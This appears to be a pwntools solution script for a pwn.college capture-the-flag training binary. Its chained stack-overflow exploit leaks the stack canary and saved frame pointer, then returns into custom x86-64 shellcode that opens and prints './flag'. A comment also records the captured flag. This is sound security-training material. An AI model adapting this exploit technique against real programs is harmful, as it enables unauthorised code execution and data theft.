from pwn import *

# 需要自己写shellcode
# 需要先泄露canary和rbp地址, 再计算出栈上数据位置, 最后返回到对应位置
# pwn_college{0FWo4Ebne8BFxKLBlei0xz2MAVN.dlzMywiMxkzW}
context(os='linux', arch='amd64',)#log_level='debug')

def getshellcode():
    shellcode = b""
    shellcode += asm("xor al, al")
    shellcode += asm("mov al, 2")
    shellcode += asm("mov rdi, 0x010166606d672e2f")
    shellcode += asm("mov r8, 0x0101010101010101")
    shellcode += asm("xor rdi, r8")
    shellcode += asm("push rdi")
    shellcode += asm("mov rdi, rsp")
    shellcode += asm("xor esi, esi")
    shellcode += asm("xor edx, edx")
    shellcode += asm("syscall")
    shellcode += asm("mov esi, eax")
    shellcode += asm("mov al, 40")
    shellcode += asm("xor edi, edi")
    shellcode += asm("inc edi")
    shellcode += asm("mov r10w, 0x3e8")
    shellcode += asm("syscall")
    shellcode += asm("mov al, 60")
    shellcode += asm("xor edi, edi")
    shellcode += asm("syscall")
    #shellcode += asm("")
    return shellcode

if __name__ == '__main__':
    target_name = "./toddler1_level2_teaching1"
    io = process(target_name)
    io.recvuntil(b"size: ")
    #shellcode = getshellcode()
    io.sendline(bytes(str(9*8+1), encoding='utf8'))
    io.recvuntil(b"!\n")
    # 第一次输入, 进行泄露
    payload_0 = b"REPEATaa"+getshellcode()
    payload_0 += (9*8-len(payload_0))*b'b'+b'c'
    io.sendline(payload_0)
    io.recvuntil(payload_0)
    canary = b'\x00'+io.recv(7)
    rbp = io.recv(6)+b'\x00\x00'
    shellcode_addr = p64(int.from_bytes(rbp, 'little') - 120)
    #print(shellcode_addr)
    #input()
    # 第二次输入, 覆盖ret到相对地址上
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(12*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_1 = 9*8*b'A'+canary+8*b'B'+shellcode_addr
    io.sendline(payload_1)
    io.interactive()
